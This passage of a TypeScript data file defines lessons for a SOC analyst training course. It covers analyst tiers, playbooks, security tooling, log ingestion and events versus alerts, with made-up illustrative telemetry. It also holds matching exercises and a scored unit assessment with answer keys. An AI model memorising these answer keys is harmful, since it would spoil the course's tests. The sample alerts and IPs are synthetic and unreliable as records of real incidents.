import { VisualStoryStep } from '@/components/learning/visual-story-demo';
import { InvestigationEvidenceCard } from '@/components/learning/interactive-investigation';
import { DragDropItem } from '@/components/learning/drag-drop-check';
import { MatchPair } from '@/components/learning/matching-check-shuffled';
import { TriageScenario } from '@/components/learning/tp-fp-triage';

export interface TopicContent {
  id: string;
  unitId: string;
  title: string;
  order: number;
  estimatedMinutes: number;
  xpReward: number;

  // 1. Theory (4-6 lines concise explanation + Know More)
  theory: {
    summaryLines: string[];
    knowMore: {
      title: string;
      description: string;
      externalUrl: string;
      externalLabel: string;
    };
  };

  // 2. Demo (Visual story / video-like animation: watch & understand)
  demo: {
    title: string;
    subtitle: string;
    steps: VisualStoryStep[];
  };

  // 3. Interactive (Hands-on investigation: click & engage)
  interactive: {
    title: string;
    scenario: string;
    cards: InvestigationEvidenceCard[];
  };

  // 4. Real-world SOC Context
  socContext: {
    title: string;
    scenario: string;
    analystMindset: string;
    bestPractices: string[];
  };

  // 5. Knowledge Checks (Varied interactive formats)
  knowledgeCheck: {
    dragDrop?: {
      title: string;
      instructions: string;
      items: DragDropItem[];
      explanation: string;
    };
    matching?: {
      title: string;
      instructions: string;
      pairs: MatchPair[];
      explanation: string;
    };
    triageScenario?: TriageScenario;
  };
}

export interface UnitAssessmentQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
}

export interface UnitStructure {
  id: string;
  unitNumber: number;
  title: string;
  description: string;
  estimatedHours: number;
  topics: TopicContent[];
  assessment: {
    id: string;
    title: string;
    passingScore: number;
    xpReward: number;
    questions: UnitAssessmentQuestion[];
  };
}

export const MODULE_04_UNITS: UnitStructure[] = [
  {
    "id": "unit-1",
    "unitNumber": 1,
    "title": "Unit 1: SOC Architecture",
    "description": "Understand the three foundational pillars (People, Process, Technology), organizational hierarchy, and enterprise telemetry data flows.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-1-1",
        "unitId": "unit-1",
        "title": "People",
        "order": 1,
        "estimatedMinutes": 15,
        "xpReward": 35,
        "theory": {
          "summaryLines": [
            "People represent the human analysts, engineers, and leaders who operate the Security Operations Center.",
            "Tier 1 (Triage Analyst): Performs first-line triage, validates alerts, extracts entities, and handles initial containment within strict SLAs.",
            "Tier 2 (Incident Responder): Conducts in-depth forensic investigation, tracks lateral movement, and executes root cause eradication.",
            "Tier 3 (Threat Hunter / SME): Performs proactive adversary hunting, malware reverse-engineering, and builds advanced detection signatures.",
            "SOC Lead & CISO: Directs operations, manages incident crises, ensures regulatory compliance, and reports to executive stakeholders."
          ],
          "knowMore": {
            "title": "NIST SP 800-61 Rev 2: Organizing an Incident Response Capability",
            "description": "Learn the official NIST guidelines on staffing models, tier responsibilities, and analyst skill requirements.",
            "externalUrl": "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
            "externalLabel": "NIST SOC Staffing"
          }
        },
        "demo": {
          "title": "[Demo] The 3-Tier SOC Staffing Model",
          "subtitle": "Follow an incident through Tier 1 Triage, Tier 2 Response, and Tier 3 Threat Hunting",
          "steps": [
            {
              "id": 1,
              "stage": "Tier 1 Triage",
              "iconName": "analyst",
              "title": "Tier 1 Claims and Qualifies Alert",
              "description": "Analyst receives alert ALT-101, validates suspicious PowerShell command line, and isolates host FIN-WS-09 within 15 minutes.",
              "telemetrySnippet": "T1 ACTION: Validated True Positive Trojan | Host Isolated | Ticket Escalated to Tier 2",
              "highlightText": "Tier 1 focuses on rapid triage and immediate containment."
            },
            {
              "id": 2,
              "stage": "Tier 2 Response",
              "iconName": "server",
              "title": "Tier 2 Performs Deep Forensics",
              "description": "Incident responder analyzes memory dump, extracts active C2 IP, and traces credential dumping attempts.",
              "telemetrySnippet": "T2 FINDING: Injected DLL in lsass.exe | C2 IP: 198.51.100.42 | Lateral Movement: Contained",
              "highlightText": "Tier 2 identifies the root cause and coordinates remediation."
            },
            {
              "id": 3,
              "stage": "Tier 3 Hunting",
              "iconName": "siem",
              "title": "Tier 3 Builds YARA Signatures & Hunts",
              "description": "Threat hunter extracts malware binary, disassembles payload in Ghidra, and sweeps 10,000 endpoints for similar IOCs.",
              "telemetrySnippet": "T3 HUNT: YARA rule deployed | Fleet Sweep: 0 additional infections found",
              "highlightText": "Tier 3 turns single incidents into enterprise-wide protection."
            }
          ]
        },
        "interactive": {
          "title": "Analyst Tier Roles & Responsibilities",
          "scenario": "Inspect the four key roles within the SOC team and review their specific operational mandates.",
          "cards": [
            {
              "id": "ev-t1",
              "category": "User",
              "label": "Tier 1 Analyst (Triage)",
              "summary": "Queue triage and initial containment.",
              "detailedFindings": "Monitors inbound alerts 24/7, extracts User/Host/IP entities, isolates compromised hosts, and escalates true threats.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-t2",
              "category": "Event ID",
              "label": "Tier 2 Analyst (Incident Responder)",
              "summary": "Deep forensics and eradication.",
              "detailedFindings": "Investigates host disk/RAM artifacts, analyzes attack timelines, remediates persistence mechanisms, and files case reports.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-t3",
              "category": "Source IP",
              "label": "Tier 3 Analyst (Threat Hunter / SME)",
              "summary": "Malware analysis and threat hunting.",
              "detailedFindings": "Reverse-engineers unknown executables, develops custom Sigma/YARA rules, and proactively hunts for stealth adversaries.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-lead",
              "category": "Timeline",
              "label": "SOC Manager / Incident Commander",
              "summary": "Leadership, SLA governance, and crisis comms.",
              "detailedFindings": "Oversees shift rosters, manages critical incident bridges, reports to the CISO, and handles external breach notifications.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "The Human Element: Avoiding Burnout",
          "scenario": "A Tier 1 analyst reviews 500 alerts per shift without break, leading to alert fatigue and a missed ransomware intrusion.",
          "analystMindset": "Security operations is a marathon, not a sprint. Proper shift rotations, automated triage assistance, and continuous learning keep analysts sharp.",
          "bestPractices": [
            "Take scheduled breaks during long monitoring shifts to maintain vigilance.",
            "Collaborate with team members during ambiguous or complex investigations.",
            "Flag recurring noisy alerts for tuning to reduce unnecessary queue burden."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match SOC Roles to Responsibilities",
            "instructions": "Match each SOC role with its primary duty.",
            "pairs": [
              {
                "id": "r1",
                "left": "Tier 1 Triage Analyst",
                "right": "First-line alert review, entity extraction, and host isolation"
              },
              {
                "id": "r2",
                "left": "Tier 2 Incident Responder",
                "right": "Deep memory forensics, attack path analysis, and eradication"
              },
              {
                "id": "r3",
                "left": "Tier 3 Threat Hunter",
                "right": "Proactive adversary hunting and malware reverse engineering"
              },
              {
                "id": "r4",
                "left": "SOC Manager",
                "right": "Operational governance, SLA management, and CISO reporting"
              }
            ],
            "explanation": "Tier 1 triages and contains; Tier 2 investigates and eradicates; Tier 3 reverses malware and hunts; Managers lead governance."
          }
        }
      },
      {
        "id": "topic-1-2",
        "unitId": "unit-1",
        "title": "Process",
        "order": 2,
        "estimatedMinutes": 15,
        "xpReward": 35,
        "theory": {
          "summaryLines": [
            "Process establishes standard operating procedures, investigation workflows, and response playbooks.",
            "Standard Operating Procedures (SOPs) provide step-by-step instructions for daily operations and routine tasks.",
            "Incident Response Playbooks define the precise investigative actions required for specific threat categories (Phishing, Ransomware, Brute Force).",
            "Service Level Agreements (SLAs) set time-bound response and resolution standards (e.g. 15-minute response for Critical alerts).",
            "Without repeatable processes, investigation quality varies widely between analysts, creating dangerous security gaps."
          ],
          "knowMore": {
            "title": "SANS Institute: Incident Response Playbooks",
            "description": "Learn how standard playbooks create repeatable, audit-ready triage procedures across enterprise security teams.",
            "externalUrl": "https://www.sans.org/white-papers/38580/",
            "externalLabel": "SANS Playbook Guide"
          }
        },
        "demo": {
          "title": "[Demo] Executing an Incident Response Playbook",
          "subtitle": "Observe how a structured playbook guides an analyst through a phishing investigation",
          "steps": [
            {
              "id": 1,
              "stage": "Playbook Initiation",
              "iconName": "analyst",
              "title": "Playbook PB-104: Phishing Triage Loaded",
              "description": "Analyst claims phishing report ticket. Playbook provides checklist: Header analysis, URL reputation, sandbox analysis.",
              "telemetrySnippet": "PLAYBOOK PB-104: Step 1: Extract sender IP. Step 2: Check SPF/DKIM. Step 3: Check URL in VirusTotal.",
              "highlightText": "Playbooks eliminate guesswork by defining standard procedures."
            },
            {
              "id": 2,
              "stage": "Step-by-Step Execution",
              "iconName": "siem",
              "title": "Verification & Threat Isolation",
              "description": "Analyst completes checklist: SPF record fails, destination URL is a credential harvesting portal.",
              "telemetrySnippet": "CHECK: SPF=Fail (Spoofed sender) | URL=login-microsoft-secure.ru (Malicious)",
              "highlightText": "Every analyst follows the identical verification steps regardless of experience."
            },
            {
              "id": 3,
              "stage": "Documented Closure",
              "iconName": "server",
              "title": "Ticket Closed with Standard Playbook Notes",
              "description": "Playbook actions completed: Sender domain blocked at gateway, password reset initiated, ticket resolved.",
              "telemetrySnippet": "RESOLUTION: Phishing Contained | Gateways Updated | User Briefed | SLA: 12m (Compliant)",
              "highlightText": "Standardized processes produce consistent, audit-ready outcomes."
            }
          ]
        },
        "interactive": {
          "title": "Process Artifacts in the SOC",
          "scenario": "Inspect the four core process documents used in daily enterprise security operations.",
          "cards": [
            {
              "id": "ev-sop",
              "category": "Timeline",
              "label": "Standard Operating Procedure (SOP)",
              "summary": "Daily operational baseline.",
              "detailedFindings": "Covers shift handovers, alert claiming order, ticket logging rules, and health check schedules.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-pb",
              "category": "Event ID",
              "label": "Ransomware Playbook PB-301",
              "summary": "Scenario-specific emergency response steps.",
              "detailedFindings": "Mandates immediate host isolation, volume snapshot verification, backup integrity checks, and executive notification.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-sla",
              "category": "User",
              "label": "SLA Matrix Policy Document",
              "summary": "Enforceable response time limits.",
              "detailedFindings": "Defines 15-minute response for P1 Critical, 1-hour for P2 High, 4-hour for P3 Medium, and 24-hour for P4 Low.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-esc-mat",
              "category": "Source IP",
              "label": "Escalation Matrix",
              "summary": "Hierarchy rules for tier handoffs.",
              "detailedFindings": "Defines exactly when an alert must move from L1 to L2, when the Incident Commander is engaged, and when external PR is summoned.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "Process Consistency During High-Stress Breaches",
          "scenario": "During an active malware outbreak, an analyst panics and begins unplugging network cables without documenting host IDs or saving RAM.",
          "analystMindset": "In high-pressure crises, rely on the playbook. Trusting proven processes prevents errors and ensures evidence is preserved.",
          "bestPractices": [
            "Follow playbook steps in order rather than skipping ahead.",
            "Document every step taken directly into the investigation ticket.",
            "Submit recommendations to update playbooks when new attacker techniques are encountered."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match Process Types to Purpose",
            "instructions": "Match each process element with its role.",
            "pairs": [
              {
                "id": "pr1",
                "left": "Incident Playbook",
                "right": "Step-by-step technical procedures for specific threat types"
              },
              {
                "id": "pr2",
                "left": "Standard Operating Procedure",
                "right": "Daily operational guidelines for shift management and triage"
              },
              {
                "id": "pr3",
                "left": "Service Level Agreement (SLA)",
                "right": "Contractual deadlines for alert response and incident containment"
              },
              {
                "id": "pr4",
                "left": "Escalation Matrix",
                "right": "Decision rules governing when to transfer tickets to higher tiers"
              }
            ],
            "explanation": "Playbooks govern specific threats, SOPs govern daily operations, SLAs set response timers, and escalation matrices control handoffs."
          }
        }
      },
      {
        "id": "topic-1-3",
        "unitId": "unit-1",
        "title": "Technology",
        "order": 3,
        "estimatedMinutes": 15,
        "xpReward": 35,
        "theory": {
          "summaryLines": [
            "Technology provides the visibility, analytics, detection, and automation platforms required to monitor enterprise assets.",
            "SIEM (Security Information & Event Management): Aggregates, correlates, and analyzes security logs from across the enterprise in real time.",
            "EDR (Endpoint Detection & Response): Continuously monitors endpoint process, file, and network activity with live isolation capabilities.",
            "NDR (Network Detection & Response): Inspects raw wire traffic, captures PCAPs, and detects lateral movement or C2 beaconing.",
            "SOAR (Security Orchestration, Automation & Response): Executes automated playbooks to enrich alerts, query threat intel, and block malicious IPs."
          ],
          "knowMore": {
            "title": "Gartner Magic Quadrant for Security Information and Event Management",
            "description": "Learn how modern SIEM, EDR, and SOAR tools integrate into unified XDR architectures.",
            "externalUrl": "https://www.gartner.com/reviews/market/security-information-and-event-management",
            "externalLabel": "Gartner SIEM Guide"
          }
        },
        "demo": {
          "title": "[Demo] The Integrated SOC Technology Stack",
          "subtitle": "Watch SIEM, EDR, NDR, and SOAR collaborate to neutralize an advanced persistent threat",
          "steps": [
            {
              "id": 1,
              "stage": "EDR Detection",
              "iconName": "endpoint",
              "title": "EDR Flags Process Injection on Endpoint",
              "description": "Defender / CrowdStrike detects shellcode injected into notepad.exe on host FIN-WS-09.",
              "telemetrySnippet": "EDR ALERT: Process Injection detected in notepad.exe (PID 6012) -> EDR isolates host network stack",
              "highlightText": "EDR provides granular host visibility and instant containment."
            },
            {
              "id": 2,
              "stage": "NDR Wire Inspection",
              "iconName": "server",
              "title": "NDR Corroborates Encrypted C2 Beacon",
              "description": "Network sensor detects periodic TLS handshakes with JA3 fingerprint matching Cobalt Strike.",
              "telemetrySnippet": "NDR ALERT: Periodic beaconing to 198.51.100.42:8443 | Jitter: 15% | TLS SNI: invalid",
              "highlightText": "NDR validates external communication across the network wire."
            },
            {
              "id": 3,
              "stage": "SIEM Correlation & SOAR Action",
              "iconName": "siem",
              "title": "SIEM Correlates Events & SOAR Blocks IP",
              "description": "SIEM correlates EDR and NDR alerts; SOAR automatically pushes firewall block rule for C2 IP.",
              "telemetrySnippet": "SOAR PLAYBOOK: Firewall block applied at edge in 4 seconds. Threat neutralised.",
              "highlightText": "Integrated technology automates rapid response to contain damage."
            }
          ]
        },
        "interactive": {
          "title": "SOC Tool Stack Capability Matrix",
          "scenario": "Inspect the primary technical platforms utilized by enterprise SOC teams.",
          "cards": [
            {
              "id": "ev-siem",
              "category": "Event ID",
              "label": "SIEM (Splunk, Sentinel, QRadar)",
              "summary": "Central log aggregator and correlation engine.",
              "detailedFindings": "Normalizes diverse log formats into common schemas, indexes petabytes of data, and executes scheduled detection rules.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-edr",
              "category": "User",
              "label": "EDR (CrowdStrike, Defender, SentinelOne)",
              "summary": "Host-level behavior monitoring and remediation.",
              "detailedFindings": "Tracks process execution trees, memory injections, script block arguments, and enables remote host isolation.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-ndr",
              "category": "Source IP",
              "label": "NDR (Zeek, Corelight, ExtraHop)",
              "summary": "Network traffic analysis and packet inspection.",
              "detailedFindings": "Analyzes unencrypted protocols, extracts SSL/TLS metadata, tracks lateral movement, and flags beaconing patterns.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-soar",
              "category": "Timeline",
              "label": "SOAR (Cortex XSOAR, Splunk SOAR)",
              "summary": "Workflow automation and orchestration.",
              "detailedFindings": "Automates repetitive tasks: VirusTotal reputation lookups, user lockout in Active Directory, and perimeter IP blocking.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "The Single Pane of Glass Reality",
          "scenario": "An analyst relies entirely on SIEM alerts without ever checking EDR or network telemetry, missing an in-memory attack.",
          "analystMindset": "No single tool provides 100% visibility. Correlate host EDR logs with network NDR traffic and perimeter firewalls for complete truth.",
          "bestPractices": [
            "Pivot from SIEM alerts directly into EDR consoles to inspect process execution trees.",
            "Cross-check external IPs against proxy and firewall logs to verify data egress volume.",
            "Leverage SOAR automated enrichment to save time during initial alert triage."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match Security Technologies to Primary Capabilities",
            "instructions": "Match each security platform to its core strength.",
            "pairs": [
              {
                "id": "tc1",
                "left": "SIEM",
                "right": "Centralized log aggregation, normalization, and cross-source correlation"
              },
              {
                "id": "tc2",
                "left": "EDR",
                "right": "Host-level process monitoring, memory inspection, and network isolation"
              },
              {
                "id": "tc3",
                "left": "NDR",
                "right": "Wire traffic analysis, protocol inspection, and packet capture"
              },
              {
                "id": "tc4",
                "left": "SOAR",
                "right": "Automated playbook orchestration, enrichment, and rapid containment actions"
              }
            ],
            "explanation": "SIEM correlates logs; EDR monitors and isolates endpoints; NDR inspects wire traffic; SOAR automates repetitive actions."
          }
        }
      },
      {
        "id": "topic-1-4",
        "unitId": "unit-1",
        "title": "Data Flow & [Demo] SOC Architecture",
        "order": 4,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "Security data flow traces the path from raw activity on an asset to actionable intelligence on an analyst dashboard.",
            "Step 1: Endpoints, servers, firewalls, and SaaS apps generate raw logs (e.g. Syslog, Windows Event Logs).",
            "Step 2: Universal Forwarders or Log Shippers compress, encrypt, and transmit logs to central collection indexers.",
            "Step 3: The SIEM parses fields (user, IP, process, timestamp), normalizes them to an OSSEM/CIM schema, and indexes them.",
            "Step 4: Real-time correlation engines evaluate rules against incoming logs and fire high-fidelity alerts when thresholds or patterns are matched."
          ],
          "knowMore": {
            "title": "MITRE ATT&CK: Data Source Mapping and Ingestion Visibility",
            "description": "Learn how modern SOCs align their log ingestion pipelines with MITRE ATT&CK techniques to eliminate detection blind spots.",
            "externalUrl": "https://attack.mitre.org/datasources/",
            "externalLabel": "MITRE Data Sources"
          }
        },
        "demo": {
          "title": "[Demo] Ingestion Pipeline: From Forwarder to Search Head",
          "subtitle": "Trace an unauthorized privilege escalation event through the 5 stages of the SOC data flow",
          "steps": [
            {
              "id": 1,
              "stage": "Endpoint Generation",
              "iconName": "endpoint",
              "title": "Windows Event ID 4688 Recorded",
              "description": "Attacker launches whoami.exe from an administrative command prompt on domain controller DC-01.",
              "telemetrySnippet": "EventID=4688 ProcessName=\"C:\\Windows\\System32\\whoami.exe\" ParentProcess=\"cmd.exe\" User=\"NT AUTHORITY\\SYSTEM\"",
              "highlightText": "Host security logs capture granular process execution telemetry."
            },
            {
              "id": 2,
              "stage": "Universal Forwarder",
              "iconName": "server",
              "title": "Log Shipper Transmits Telemetry",
              "description": "The Splunk / Elastic forwarder reads the event channel, encrypts it with TLS, and queues it for the central indexer.",
              "telemetrySnippet": "TCP 9997 [TLSv1.3] DC-01 -> SIEM-IDX-01 | Encrypted Payload: 412 bytes",
              "highlightText": "Forwarders guarantee log integrity and prevent log tampering on local disks."
            },
            {
              "id": 3,
              "stage": "SIEM Parsing & Normalization",
              "iconName": "siem",
              "title": "CIM Field Extraction & Indexing",
              "description": "The indexer parses the payload into structured keys: process_name, parent_process, dest_host, and user_id.",
              "telemetrySnippet": "EXTRACT: dest=\"DC-01\" action=\"created\" process=\"whoami.exe\" parent=\"cmd.exe\"",
              "highlightText": "Normalization allows one unified detection rule to cover Windows, Linux, and Cloud telemetry."
            },
            {
              "id": 4,
              "stage": "Correlation Engine",
              "iconName": "siem",
              "title": "Sigma Rule Match & Alert Creation",
              "description": "Correlation rule \"Discovery: Reconnaissance Commands on Domain Controller\" matches the normalized event.",
              "telemetrySnippet": "ALERT GENERATED: AlertID=ALT-8910 Severity=Medium Status=New",
              "highlightText": "Correlation rules turn millions of raw data points into actionable queue items."
            },
            {
              "id": 5,
              "stage": "Analyst Dashboard",
              "iconName": "analyst",
              "title": "Triage Ticket Displayed in SOC Console",
              "description": "Tier 1 queue updates in real-time. Analyst claims ticket within 5-minute SLA timer.",
              "telemetrySnippet": "QUEUE: [ALT-8910] DC-01 Reconnaissance | SLA: 14m remaining | Assigned: Analyst",
              "highlightText": "The analyst receives the structured alert with all relevant entity context pre-populated."
            }
          ]
        },
        "interactive": {
          "title": "Log Ingestion Path Verification",
          "scenario": "Verify the components responsible for moving telemetry from internal subnets to the SOC search heads.",
          "cards": [
            {
              "id": "ev-ep",
              "category": "Event ID",
              "label": "Endpoint Telemetry Agent",
              "summary": "Sysmon / Windows Event Log Service.",
              "detailedFindings": "Records process creations, network sockets, DNS queries, and driver loadings locally in EVTX format.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-fwd",
              "category": "Source IP",
              "label": "Universal Forwarder (Port 9997 / 514)",
              "summary": "Secure lightweight transport agent.",
              "detailedFindings": "Streams local logs over TLS to central indexers with disk-spooling failover if network connection drops.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-idx",
              "category": "Timeline",
              "label": "SIEM Indexer Cluster",
              "summary": "Stores and indexes searchable chunks.",
              "detailedFindings": "Writes logs to Hot, Warm, and Cold storage buckets according to compliance retention policies.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-sh",
              "category": "User",
              "label": "Search Head & Correlation Daemon",
              "summary": "Analyst interface and scheduled searches.",
              "detailedFindings": "Executes SPL / KQL queries across indexers and raises alerts to the SOAR ticketing console.",
              "severityIndicator": "Suspicious"
            }
          ]
        },
        "socContext": {
          "title": "Understanding Telemetry Delays (Latency & Jitter)",
          "scenario": "An attacker compromises a laptop while the employee is traveling on an airplane. No logs reach the SIEM until the VPN reconnects.",
          "analystMindset": "Always compare Event Timestamp (when it happened on the host) vs Ingestion Timestamp (when the SIEM received it). A 4-hour delay indicates host disconnection or forwarder queuing.",
          "bestPractices": [
            "Account for timezone conversions (ensure all SIEM queries standardize on UTC).",
            "Investigate ingestion lag if alerts appear minutes or hours after process execution.",
            "Report broken forwarders immediately to maintain visibility coverage."
          ]
        },
        "knowledgeCheck": {
          "dragDrop": {
            "title": "Sequence the SOC Data Flow",
            "instructions": "Drag and arrange the 5 stages of security data flow in their correct sequential order from origin to analyst.",
            "items": [
              {
                "id": "df-1",
                "label": "1. Event Generation on Host (Process execution / network socket)",
                "order": 1
              },
              {
                "id": "df-2",
                "label": "2. Forwarder Transmission (Encrypted log shipping via TLS)",
                "order": 2
              },
              {
                "id": "df-3",
                "label": "3. SIEM Parsing & Normalization (Extracting standard CIM fields)",
                "order": 3
              },
              {
                "id": "df-4",
                "label": "4. Correlation Rule Trigger (Detection criteria met, alert created)",
                "order": 4
              },
              {
                "id": "df-5",
                "label": "5. Analyst Triage (L1 claims ticket and verifies IOCs)",
                "order": 5
              }
            ],
            "explanation": "Telemetry originates on the host, travels via log forwarders to the SIEM, undergoes normalization and correlation, and finally surfaces as an analyst alert."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-1-assessment",
      "title": "Unit 1 Assessment: SOC Architecture & Data Flow",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u1-q1",
          "question": "What are the three fundamental pillars that form the foundation of any effective SOC?",
          "options": [
            "Hardware, Software, Firmware",
            "People, Process, Technology",
            "Firewalls, Antivirus, SIEM",
            "Identification, Protection, Recovery"
          ],
          "correctAnswer": 1,
          "explanation": "The three foundational pillars of a SOC are People (analysts), Process (SOPs and playbooks), and Technology (monitoring tools)."
        },
        {
          "id": "u1-q2",
          "question": "In a tiered SOC hierarchy, what is the primary operational responsibility of a Tier 1 Analyst?",
          "options": [
            "Malware reverse engineering and memory extraction",
            "Writing executive risk disclosures for the board",
            "Triage inbound alerts, extract entities, verify IOCs, and escalate true threats within SLA",
            "Designing enterprise firewall architectures"
          ],
          "correctAnswer": 2,
          "explanation": "Tier 1 analysts handle initial queue triage, entity validation, basic containment, and escalation within SLA timeframes."
        },
        {
          "id": "u1-q3",
          "question": "Why is log normalization to a Common Information Model (CIM) essential in a modern SIEM?",
          "options": [
            "It compresses logs to zero bytes",
            "It allows unified detection rules to query fields consistently across heterogeneous vendors (Windows, Linux, Palo Alto)",
            "It eliminates the need for Tier 2 analysts",
            "It encrypts local workstation hard drives"
          ],
          "correctAnswer": 1,
          "explanation": "Normalization standardizes field names (e.g. src_ip, user, process_name) so rules can detect attacks regardless of the log vendor source."
        },
        {
          "id": "u1-q4",
          "question": "When comparing Event Time vs Ingestion Time in an alert investigation, a large time difference usually indicates:",
          "options": [
            "A cyberattack in progress",
            "Telemetry latency caused by offline endpoints, slow network pipes, or forwarder queuing",
            "The SIEM clock is broken",
            "The alert is definitely a false positive"
          ],
          "correctAnswer": 1,
          "explanation": "A gap between Event Time (endpoint occurrence) and Ingestion Time (SIEM receipt) indicates network latency, offline machines, or forwarder backlog."
        }
      ]
    }
  },
  {
    "id": "unit-2",
    "unitNumber": 2,
    "title": "Unit 2: Alerts & Events",
    "description": "Learn the strict operational taxonomy separating raw log Events from SIEM Alerts, qualified Incidents, and legal Cases.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-2-1",
        "unitId": "unit-2",
        "title": "Topic 1: Events vs. Alerts",
        "order": 1,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "An Event is any observable occurrence in a system, network, or application (e.g. user login, DNS query, firewall packet drop).",
            "An enterprise generates billions of events daily—99.99% of which are normal, benign business activities.",
            "An Alert is an event (or correlated sequence of events) that meets a predefined detection rule or statistical threshold indicating potential malicious activity.",
            "Alerts require human or automated investigation to evaluate context and determine legitimacy.",
            "Confusing raw events with alerts leads to catastrophic analyst burnout and alert fatigue."
          ],
          "knowMore": {
            "title": "SANS Institute: From Logs to Security Events and Alerts",
            "description": "Read the SANS guide on event filtering, correlation rules, and reducing noise in enterprise monitoring systems.",
            "externalUrl": "https://www.sans.org/white-papers/33209/",
            "externalLabel": "SANS Event Management"
          }
        },
        "demo": {
          "title": "[Demo] Distinguishing Events from Alerts",
          "subtitle": "Watch how 10,000 raw authentication events are distilled into a single high-priority brute force alert",
          "steps": [
            {
              "id": 1,
              "stage": "Raw Events",
              "iconName": "server",
              "title": "Individual Failed Login Events Recorded",
              "description": "Active Directory records Event ID 4625 for 50 rapid failed attempts against user \"svc_backup\".",
              "telemetrySnippet": "Event 4625: An account failed to log on. Account: svc_backup. Failure Reason: Bad Password.",
              "highlightText": "A single failed login is merely an event; users mistype passwords every day."
            },
            {
              "id": 2,
              "stage": "Correlation Threshold",
              "iconName": "siem",
              "title": "Rule Threshold Triggered",
              "description": "Correlation rule detects >20 failed logins for the same account within 60 seconds from an internal IP.",
              "telemetrySnippet": "THRESHOLD_MET: count(EventID=4625) > 20 within 60s from SourceIP=10.0.4.15",
              "highlightText": "Aggregation and statistical thresholding transform raw events into an alert."
            },
            {
              "id": 3,
              "stage": "Alert Creation",
              "iconName": "analyst",
              "title": "SIEM Alert Pushed to L1 Queue",
              "description": "The detection engine surfaces Alert ALT-204 \"Password Spray / Brute Force on Service Account\".",
              "telemetrySnippet": "ALERT: Severity=High | Target=svc_backup | Source=10.0.4.15 | Attempts=52",
              "highlightText": "The analyst investigates the Alert, not each individual event log manually."
            }
          ]
        },
        "interactive": {
          "title": "Event vs. Alert Classification",
          "scenario": "Review the four telemetry signals below and determine whether each is a raw Event or an actionable Alert.",
          "cards": [
            {
              "id": "ev-single-login",
              "category": "Event ID",
              "label": "Workstation Logon (Event 4624)",
              "summary": "User alice logs into her assigned desktop at 08:30 AM.",
              "detailedFindings": "Logon Type 2 (Interactive). Normal workstation IP. Single instance matching user daily working hours.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-mimikatz-alert",
              "category": "Event ID",
              "label": "EDR Alert: LSASS Memory Dump",
              "summary": "ProcDump opened handle with PROCESS_VM_READ to lsass.exe.",
              "detailedFindings": "Correlated signature match for MITRE T1003.001. Process terminated by EDR policy.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-dhcp-lease",
              "category": "Timeline",
              "label": "DHCP IP Assignment",
              "summary": "DHCP server leases 192.168.10.45 to printer PRNT-02.",
              "detailedFindings": "Standard UDP port 67/68 exchange. Normal network infrastructure event.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-c2-beacon",
              "category": "Source IP",
              "label": "NDR Alert: Cobalt Strike Malleable C2 Beaconing",
              "summary": "Outbound HTTP traffic with periodic 60s jitter to untrusted VPS.",
              "detailedFindings": "Matching known JA3 fingerprint and URI pattern /api/v1/telemetry with self-signed certificate.",
              "severityIndicator": "Malicious"
            }
          ]
        },
        "socContext": {
          "title": "Managing the Alert-to-Event Ratio",
          "scenario": "A SOC director notices analysts are closing 400 alerts an hour without investigating because threshold rules fire on every port scan.",
          "analystMindset": "If an alert fires 100 times a day and 99 are ignored, it is not an alert—it is noise. Raise tuning tickets to fix noisy detection logic.",
          "bestPractices": [
            "Verify raw underlying events before forming a triage conclusion.",
            "Check for event suppression or deduplication in the SIEM to prevent duplicate queue items.",
            "Ensure alerts provide direct drill-down links to original raw event logs."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Classify Telemetry as Event vs Alert",
            "instructions": "Match the description on the left with whether it constitutes an Event or an Alert.",
            "pairs": [
              {
                "id": "ea1",
                "left": "Firewall drops a single inbound packet on port 445",
                "right": "Raw Event"
              },
              {
                "id": "ea2",
                "left": "Host initiates 500 connections to external IPs in 5 seconds",
                "right": "Actionable Alert"
              },
              {
                "id": "ea3",
                "left": "Employee unlocks their Windows screen at 9:00 AM",
                "right": "Raw Event"
              },
              {
                "id": "ea4",
                "left": "PowerShell executes Base64-encoded download string",
                "right": "Actionable Alert"
              }
            ],
            "explanation": "Single operational occurrences are raw Events; patterns matching threat signatures or anomaly thresholds are Alerts."
          }
        }
      },
      {
        "id": "topic-2-2",
        "unitId": "unit-2",
        "title": "Topic 2: Incidents & Cases",
        "order": 2,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "An Alert becomes an Incident when an analyst investigates and confirms that unauthorized, malicious, or policy-violating activity has actually occurred.",
            "Not all alerts are incidents: false positives are closed, and benign true positives are handled without formal incident declaration.",
            "A Case is the formal operational and legal container tracking the entire incident lifecycle (evidence artifacts, timeline, notes, remediation).",
            "Cases maintain chain of custody, track billable hours, record regulatory notification deadlines, and support post-incident audits.",
